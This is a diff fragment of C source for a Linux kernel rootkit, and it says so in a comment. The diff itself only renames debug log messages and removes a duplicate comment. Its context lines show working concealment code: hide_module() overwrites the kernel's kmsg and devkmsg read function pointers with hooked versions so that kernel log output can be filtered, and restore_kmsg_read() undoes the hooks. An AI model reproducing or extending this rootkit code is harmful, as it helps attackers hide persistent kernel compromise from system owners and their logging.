@@ -33,7 +33,6 @@ const string_t S_HIDDEN_PREFIXES[] = STRING_ARRAY(HIDDEN_PREFIXES);
 static bool b_hidden = false; // Is the rootkit hidden?
 
 static struct list_head *p_prev_module = NULL; // Pointer to the previous module in the list
-// static struct list_head *p_prev_module = NULL; // Pointer to the previous module in the list
 
 static task_t *(*_find_get_task_by_vpid)(pid_t nr) = NULL; // Pointer to `find_get_task_by_vpid()`
 
@@ -218,11 +217,11 @@ void hide_module(void)
         pr_dev_err("  * Failed to get `kmsg_proc_ops` address\n");
     }
     else {
-        pr_dev_info("  * p_kmsg_proc_ops: %p\n", p_kmsg_proc_ops);
+        pr_dev_info("  * kmsg_proc_ops: %p\n", p_kmsg_proc_ops);
 
         IF_L (p_orig_kmsg_read == NULL) {
             p_orig_kmsg_read = p_kmsg_proc_ops->proc_read;
-            pr_dev_info("  * p_orig_kmsg_read: %p\n", p_orig_kmsg_read);
+            pr_dev_info("  * kmsg_read: %p\n", p_orig_kmsg_read);
             change_protected_value(&p_kmsg_proc_ops->proc_read, kmsg_read_hooked);
         }
     }
@@ -234,11 +233,11 @@ void hide_module(void)
         pr_dev_err("  * Failed to get `kmsg_fops` address\n");
     }
     else {
-        pr_dev_info("  * p_kmsg_fops: %p\n", p_kmsg_fops);
+        pr_dev_info("  * kmsg_fops: %p\n", p_kmsg_fops);
 
         IF_L (p_orig_devkmsg_read == NULL) {
             p_orig_devkmsg_read = p_kmsg_fops->read;
-            pr_dev_info("  * p_orig_devkmsg_read: %p\n", p_orig_devkmsg_read);
+            pr_dev_info("  * devkmsg_read: %p\n", p_orig_devkmsg_read);
             change_protected_value(&p_kmsg_fops->read, devkmsg_read_hooked);
         }
     }
@@ -504,7 +503,7 @@ void restore_kmsg_read(void)
     pr_dev_info("Restoring `kmsg_read()`...\n");
 
     IF_U (p_kmsg_proc_ops == NULL) {
-        pr_dev_err("* `kmsg_proc_ops` is NULL\n");
+        pr_dev_err("* `p_kmsg_proc_ops` is NULL\n");
         goto devkmsg;
     }
 
@@ -521,7 +520,7 @@ devkmsg:
     pr_dev_info("Restoring `devkmsg_read()`...\n");
 
     IF_U (p_kmsg_fops == NULL) {
-        pr_dev_err("* `kmsg_fops` is NULL\n");
+        pr_dev_err("* `p_kmsg_fops` is NULL\n");
         return;
     }
 
